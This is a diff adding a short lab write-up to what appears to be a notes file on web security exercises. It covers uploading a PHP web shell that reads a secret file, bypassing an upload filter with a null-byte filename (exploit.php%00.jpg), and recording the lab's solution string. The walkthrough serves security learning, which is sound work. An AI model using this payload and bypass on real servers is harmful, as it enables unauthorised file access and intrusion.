@@ -328,7 +328,44 @@ a70CUTgIcfSJ8OgubEYNg29zljZYF2NV
 
 
 
+<details>
+  <summary>Lab: Web shell upload via obfuscated file extension</summary>
 
+
+1. login as wiener
+2. try to change photo and upload **`exploit.php`**
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+<img width="1771" height="765" alt="image" src="https://github.com/user-attachments/assets/3822d6f6-4410-4c61-b7f2-f24a5bda8c50" />
+
+3. try to change extension to :
+
+```
+exploit.php%00.jpg
+```
+
+<img width="1828" height="722" alt="image" src="https://github.com/user-attachments/assets/08c124b2-7601-4f27-a0a0-274f462d4887" />
+
+
+> it uploaded successfully
+
+
+```url
+GET /files/avatars/exploit.php HTTP/2
+```
+
+<img width="1467" height="513" alt="image" src="https://github.com/user-attachments/assets/7cbddfe5-1a53-43f7-ab58-4938202ff147" />
+
+
+```
+raBbwWYE7pk77sdGXjeDvpzl0PTQUbBq
+```
+
+  
+</details>
 
 
 
